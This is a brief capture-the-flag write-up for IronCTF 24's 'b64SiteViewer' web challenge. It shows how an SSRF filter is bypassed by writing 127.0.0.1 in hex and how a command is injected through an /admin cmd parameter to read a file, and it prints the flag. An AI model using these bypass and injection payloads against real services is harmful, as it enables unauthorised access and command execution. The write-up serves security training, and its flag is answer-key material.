# IRONCTF 24

## b64SiteViewer | webex

### Description: 

Hey everyone, check out my new Base64 site viewer! The admin believes he's invincible.Do you have what it takes to outsmart him?
Flag Format: ironCTF{alphanumeric_lowercase}

# Author: 4rUN


### Solve :

ssrf & command injection attacks with some filters :

firstly we bypass the 127.0.0.1 with some hex 
so it will be ``0x7f.0x00.0x00.0x01``

next we try to do a command injection in the /admin endpoint 

we see that some chars are filters like cat 

so i use ls to see all file i find 

```echo 'YXBwLnB5CnJlcXVpcmVtZW50cy50eHQKcnVuLnNoCnRlbXBsYXRlcwo=' | base64 -d```
```app.py requirements.txt run.sh templates```

so we use 

```http://0x7f.0x0.0x0.0x1:5000/admin?cmd=head+run*``

decode it from base64 and we get our flag 

**ironCTF{y0u4r3r0ck1n6k33ph4ck1n6}**




